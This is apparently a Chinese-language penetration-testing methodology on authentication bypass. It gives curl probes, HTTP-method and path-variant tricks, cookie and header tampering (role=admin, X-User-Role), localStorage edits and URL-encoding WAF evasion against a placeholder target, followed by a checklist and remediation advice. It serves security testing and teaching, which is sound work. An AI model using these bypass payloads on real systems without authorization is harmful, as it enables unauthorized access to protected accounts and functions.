# 认证绕过检测方法论

---

# 第一部分：文档概述

## 1.1 编写目的

本文档旨在为渗透测试人员提供一套标准化的认证绕过检测与利用流程，帮助发现和利用认证机制中的缺陷。

## 1.2 适用范围

本文档适用于所有需要用户认证的 Web 应用、API 接口和移动应用。

## 1.3 读者对象

本文件主要面向执行渗透测试任务的安全工程师、安全分析师。

---

# 第二部分：核心渗透技术专题

## 2.1 技术介绍

### 漏洞原理

认证绕过是指攻击者通过技术手段绕过系统的身份验证机制，直接访问需要认证的资源或功能。

**本质问题**：
- 认证逻辑实现缺陷
- 过度信任客户端
- 缺少服务端验证
- 认证状态管理不当

### 常见 CWE 映射

| CWE 编号 | 描述 |
|---------|------|
| CWE-287 | 不当认证 |
| CWE-288 | 认证绕过 |
| CWE-306 | 关键功能缺少认证 |

## 2.2 攻击常见于哪些业务场景

| 业务场景 | 功能示例 | 风险点描述 |
|---------|---------|-----------|
| 管理后台 | 管理员功能 | 前端隐藏但未服务端验证 |
| API 接口 | 受保护 API | 缺少 Token 验证 |
| 单页应用 | 前端路由 | 仅前端检查认证状态 |
| 移动应用 | 本地认证 | 客户端认证可绕过 |
| 微服务 | 服务间调用 | 缺少服务认证 |

## 2.3 漏洞发现方法

### 2.3.1 直接访问测试

```bash
# 测试未认证直接访问
curl https://target.com/admin
curl https://target.com/api/users

# 检查响应：
# - 200 OK 表示可能绕过
# - 302 重定向到登录页表示正常
# - 401/403 表示有保护
```

### 2.3.2 HTTP 方法绕过

```bash
# GET 被拦截，尝试 POST
GET /admin/users  → 403
POST /admin/users → 200

# 尝试其他方法
OPTIONS /admin/users
HEAD /admin/users
PATCH /admin/users
```

### 2.3.3 路径遍历绕过

```bash
# 测试路径变体
/admin
/admin/
/admin/.
/admin/..;/
//admin
/./admin
```

## 2.4 漏洞利用方法

### 2.4.1 前端认证绕过

```javascript
// 单页应用常见模式
// 检查路由守卫是否仅在前端执行

// 方法 1：直接访问 API
fetch('https://target.com/api/admin/users')

// 方法 2：修改本地状态
// 在浏览器控制台执行
localStorage.setItem('isLoggedIn', 'true')
sessionStorage.setItem('userRole', 'admin')
```

### 2.4.2 Cookie 篡改

```bash
# 修改认证 Cookie
# 原始：logged_in=false
# 修改：logged_in=true

# 修改角色 Cookie
# 原始：role=user
# 修改：role=admin
```

### 2.4.3 认证头注入

```bash
# 添加自定义认证头
X-Authenticated: true
X-User-Role: admin
X-Access-Token: admin

# 某些应用可能信任这些头
```

## 2.5 漏洞利用绕过方法

### 2.5.1 WAF 绕过

```bash
# URL 编码
/admin → /%61dmin

# 双编码
/admin → /%2561dmin

# 使用特殊字符
/admin; /admin# /admin?
```

### 2.5.2 认证状态维持

```bash
# 利用"记住我"功能
# 即使会话过期，Remember-Me Cookie 可能仍然有效

# 利用并发会话
# 在一个会话中认证，另一个会话可能共享状态
```

---

# 第三部分：附录

## 3.1 认证绕过测试检查清单

```
□ 直接访问受保护页面
□ 尝试不同 HTTP 方法
□ 修改 Cookie 值
□ 添加自定义认证头
□ 测试路径遍历
□ 测试 URL 编码绕过
□ 检查前端认证逻辑
□ 测试 API 端点认证
```

## 3.2 修复建议

1. **服务端验证** - 所有认证检查必须在服务端执行
2. **统一认证中间件** - 使用统一的认证中间件处理所有请求
3. **最小权限原则** - 默认拒绝所有访问
4. **定期审计** - 定期审查认证逻辑

---

**参考资源**：
- [OWASP Cheat Sheet: Authentication](https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html)
- [PortSwigger - Authentication](https://portswigger.net/web-security/authentication)
